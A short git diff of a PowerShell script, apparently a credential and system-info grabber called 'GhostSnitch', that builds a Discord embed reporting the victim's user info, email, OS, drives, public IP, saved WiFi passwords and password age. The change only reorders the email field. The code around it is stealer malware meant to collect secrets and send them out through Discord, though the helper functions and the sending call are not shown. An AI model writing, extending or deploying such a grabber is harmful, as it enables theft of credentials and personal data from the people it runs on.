@@ -216,6 +216,7 @@ $discordPayload = @{
         color = 16711680
         fields = @(
             @{ name = "🧑‍💻 User Info"; value = (Get-UserInfo); inline = $true },
+            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false },
             @{ name = "🖥️ OS"; value = (Get-OS); inline = $true },
             @{ name = "⏱️ Uptime"; value = (Get-Uptime); inline = $true },
             @{ name = "💽 Drives"; value = (Get-DriveStats); inline = $false },
@@ -228,8 +229,7 @@ $discordPayload = @{
             @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
             @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
             @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
-            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false },
-            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false }
+            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false }
         )
         footer = @{ text = "GhostSnitch v1.0 by TBJr" }
         timestamp = (Get-Date).ToString("o")
